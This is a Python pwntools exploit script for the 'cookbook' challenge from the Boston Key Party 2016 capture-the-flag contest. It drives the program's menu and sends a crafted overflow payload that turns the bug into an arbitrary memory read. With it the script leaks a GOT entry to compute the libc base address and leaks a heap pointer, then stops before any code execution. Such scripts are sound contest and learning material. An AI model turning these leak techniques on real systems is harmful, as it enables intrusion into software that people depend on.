# -*- coding: utf-8 -*-
#
# Boston Key Party 2016 pwnable cookbook
#

from pwn import *

r = process('./cookbook')
b = ELF('./cookbook')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

def s(msg):
    r.send(msg + '\n')


def leak(addr):
    s('c')
    s('n')
    s('d')
    s('q')
    s('g')
    s('40C')
    payload = '\x00' * 124
    payload += p32(addr)
    s(payload)
    s('c')
    r.recv()
    s('p')
    resp = r.recvuntil('[q]uit\n')
    print resp
    leaked = u32(resp.split('recipe type: ')[1][0:4])
    s('q')
    return leaked

if __name__ == "__main__":
    r.recvuntil("what's your name?")

    s('babo')

    r.recvuntil('[q]uit\n')
    
    leaked = leak(b.got['strtoul'])
    log.info('LIBC_BASE: 0x%x' % (leaked - libc.symbols['strtoul']))

    leaked = leak(0x804d0a0)
    log.info('HEAP: 0x%x' % leaked)
    
    pause()
